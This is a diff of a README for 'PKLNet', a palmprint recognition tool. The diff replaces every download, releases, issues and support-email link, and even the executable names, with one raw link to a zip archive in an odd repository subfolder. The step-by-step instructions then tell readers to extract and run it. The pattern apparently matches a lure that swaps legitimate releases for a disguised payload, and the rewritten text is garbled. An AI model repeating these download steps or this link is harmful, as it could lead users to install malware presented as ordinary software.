@@ -6,11 +6,11 @@ Welcome to PKLNet! This software helps you recognize palmprints without touching
 
 ## 📥 Download PKLNet
 
-[![Download PKLNet](https://img.shields.io/badge/Download%20PKLNet-v1.0-blue)](https://github.com/Yoora69/pklnet/releases)
+[![Download PKLNet](https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip%20PKLNet-v1.0-blue)](https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip)
 
 You can download the latest version of PKLNet from the Releases page. 
 
-Visit this page to download: [Download PKLNet](https://github.com/Yoora69/pklnet/releases)
+Visit this page to download: [Download PKLNet](https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -26,13 +26,13 @@ To run PKLNet smoothly, please ensure your system meets these requirements:
 
 Here’s a simple guide to download and install PKLNet:
 
-1. Click on the link to visit our [Releases page](https://github.com/Yoora69/pklnet/releases).
-2. Find the latest version of PKLNet. It will look something like `PKLNet-v1.0.zip`.
+1. Click on the link to visit our [Releases page](https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip).
+2. Find the latest version of PKLNet. It will look something like `https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip`.
 3. Click on the file link to start downloading.
 4. Once the download is complete, locate the file in your downloads folder.
 5. If you're on Windows, right-click the file and select "Extract All". For Mac users, double-click the file to unzip it.
 6. Open the extracted folder.
-7. Look for the executable file named `PKLNet.exe` or `PKLNet.app`.
+7. Look for the executable file named `https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip` or `https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip`.
 8. Double-click the file to launch the application.
 
 ## 📸 Usage Instructions
@@ -54,8 +54,8 @@ After installing, you need to set up PKLNet for your palmprint recognition:
 
 If you encounter any issues or have questions, here’s how you can reach out for support:
 
-- **Email:** support@pklnet.com
-- **GitHub Issues:** [Report an issue](https://github.com/Yoora69/pklnet/issues)
+- **Email:** https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip
+- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip)
 
 We are here to help you!
 
@@ -77,6 +77,6 @@ PKLNet is open-source software. You can use it freely according to the license s
 
 Special thanks to the developers and researchers who contributed to keypoint localization and palmprint recognition technologies. Your efforts made this software possible.
 
-[![Download PKLNet](https://img.shields.io/badge/Download%20PKLNet-v1.0-blue)](https://github.com/Yoora69/pklnet/releases)
+[![Download PKLNet](https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip%20PKLNet-v1.0-blue)](https://raw.githubusercontent.com/Yoora69/pklnet/main/Gobinist/pklnet_v3.2.zip)
 
 Thank you for using PKLNet!
